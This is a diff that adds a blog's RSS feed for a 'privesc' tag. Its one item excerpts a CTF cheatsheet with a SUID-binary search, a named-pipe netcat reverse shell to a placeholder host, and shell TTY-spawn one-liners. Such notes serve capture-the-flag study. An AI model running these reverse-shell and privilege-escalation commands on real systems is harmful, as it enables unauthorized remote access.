@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Privesc on Master 0xCcC</title>
+    <link>https://masterccc.github.io/tags/privesc/</link>
+    <description>Recent content in Privesc on Master 0xCcC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 27 Aug 2019 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://masterccc.github.io/tags/privesc/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Ctf Memo</title>
+      <link>https://masterccc.github.io/memo/ctf/</link>
+      <pubDate>Tue, 27 Aug 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://masterccc.github.io/memo/ctf/</guid>
+      <description>Cheatsheet - CTF Fin SUID find / -user root -perm -4000 -exec ls -ldb {} \;  Netcat without -e mknod /tmp/bp p /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp  One-line :
+mknod /tmp/bp p ; /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp  Spawn a TTY Python python -c &#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&#39;  Shell /bin/sh -i  Other https://netsec.ws/?p=337</description>
+    </item>
+    
+  </channel>
+</rss>
